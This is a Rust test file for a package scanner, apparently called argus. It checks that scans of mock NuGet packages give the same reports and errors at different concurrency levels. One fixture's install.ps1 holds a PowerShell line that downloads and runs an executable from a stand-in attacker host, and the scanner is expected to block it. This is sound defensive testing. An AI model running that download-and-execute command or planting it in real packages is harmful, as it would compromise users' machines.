use argus_core::{Decision, ExecutionContext, ScanConcurrency, ScanReport};
use argus_nuget::{fetch_and_scan_nuget_with_rules_and_context, NugetFetchOptions, NugetRef};
use argus_rules::RuleSession;
use argus_test_support::MockTransport;
use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;
use sha2::{Digest, Sha512};
use std::io::Write;

const REGISTRY: &str = "https://api.nuget.org";
const ID: &str = "jobs.parity";
const VERSION: &str = "1.0.0";

fn nuget_jobs_nuspec() -> Vec<u8> {
    format!(
        r#"<?xml version="1.0"?><package><metadata><id>{ID}</id><version>{VERSION}</version><authors>test</authors></metadata></package>"#
    )
    .into_bytes()
}

fn make_nuget_jobs_nupkg(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut bytes));
        let options: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (path, body) in files {
            writer.start_file(*path, options).unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    bytes
}

fn nuget_jobs_execution(jobs: usize) -> ExecutionContext {
    ExecutionContext::new(ScanConcurrency::new(jobs).unwrap()).unwrap()
}

fn scan_nuget_jobs_fixture(
    files: &[(&str, &[u8])],
    rules: &RuleSession,
    jobs: usize,
) -> anyhow::Result<ScanReport> {
    let bytes = make_nuget_jobs_nupkg(files);
    let transport = MockTransport::new();
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/{ID}/index.json"),
        format!(r#"{{"versions":["{VERSION}"]}}"#).into_bytes(),
    );
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/{ID}/{VERSION}/{ID}.{VERSION}.nupkg"),
        bytes.clone(),
    );
    let catalog_url = format!("{REGISTRY}/v3/catalog0/data/{ID}.{VERSION}.json");
    transport.insert(
        &format!("{REGISTRY}/v3/registration5-gz-semver2/{ID}/{VERSION}.json"),
        format!(r#"{{"catalogEntry":{{"@id":"{catalog_url}"}}}}"#).into_bytes(),
    );
    transport.insert(
        &catalog_url,
        format!(
            r#"{{"packageHash":"{}","packageHashAlgorithm":"SHA512"}}"#,
            STANDARD.encode(Sha512::digest(&bytes))
        )
        .into_bytes(),
    );
    fetch_and_scan_nuget_with_rules_and_context(
        &NugetRef::parse(&format!("{ID}@{VERSION}")).unwrap(),
        &NugetFetchOptions::default(),
        &transport,
        rules,
        &nuget_jobs_execution(jobs),
    )
}

fn assert_nuget_report_parity(
    scan_case: impl Fn(usize) -> anyhow::Result<ScanReport>,
) -> ScanReport {
    let baseline = scan_case(1).unwrap();
    let baseline_json = serde_json::to_vec(&baseline).unwrap();
    for jobs in [2, 8, 64] {
        assert_eq!(
            serde_json::to_vec(&scan_case(jobs).unwrap()).unwrap(),
            baseline_json,
            "report changed with jobs={jobs}"
        );
    }
    baseline
}

#[test]
fn nuget_builtin_reports_and_errors_are_jobs_invariant() {
    let spec = nuget_jobs_nuspec();
    let builtin = RuleSession::builtin().unwrap();
    let positive = assert_nuget_report_parity(|jobs| {
        scan_nuget_jobs_fixture(
            &[
                ("Jobs.Parity.nuspec", &spec),
                (
                    "tools/install.ps1",
                    b"Invoke-WebRequest https://evil.invalid/p.exe -OutFile p.exe; Start-Process p.exe",
                ),
            ],
            &builtin,
            jobs,
        )
    });
    assert_eq!(positive.decision, Decision::Block);
    assert!(positive
        .findings
        .iter()
        .any(|finding| finding.rule_id == "nuget-install-script"));

    let clean = assert_nuget_report_parity(|jobs| {
        scan_nuget_jobs_fixture(
            &[
                ("Jobs.Parity.nuspec", &spec),
                ("lib/net8.0/readme.txt", b"ordinary package"),
            ],
            &builtin,
            jobs,
        )
    });
    assert_eq!(clean.decision, Decision::Allow);

    let rules_dir = tempfile::tempdir().unwrap();
    std::fs::write(
        rules_dir.path().join("error.yaml"),
        "schema_version: 1\nrules:\n  - { id: jobs-error, description: jobs error, \
         policy_class: blocking, default_severity: high, \
         help_uri: https://example.test/jobs-error, languages: [text], \
         matcher: { kind: literal, pattern: marker } }\n",
    )
    .unwrap();
    let error_rules = RuleSession::load(Some(rules_dir.path()), &[]).unwrap();
    let malformed = [
        ("Jobs.Parity.nuspec", spec.as_slice()),
        ("a-invalid.txt", b"marker \xff".as_slice()),
        ("b-invalid.txt", b"marker \xfe".as_slice()),
    ];
    let error_for = |jobs| {
        format!(
            "{:#}",
            scan_nuget_jobs_fixture(&malformed, &error_rules, jobs).unwrap_err()
        )
    };
    let baseline_error = error_for(1);
    assert!(baseline_error.contains("a-invalid.txt"), "{baseline_error}");
    for jobs in [2, 8, 64] {
        assert_eq!(
            error_for(jobs),
            baseline_error,
            "error changed with jobs={jobs}"
        );
    }
}
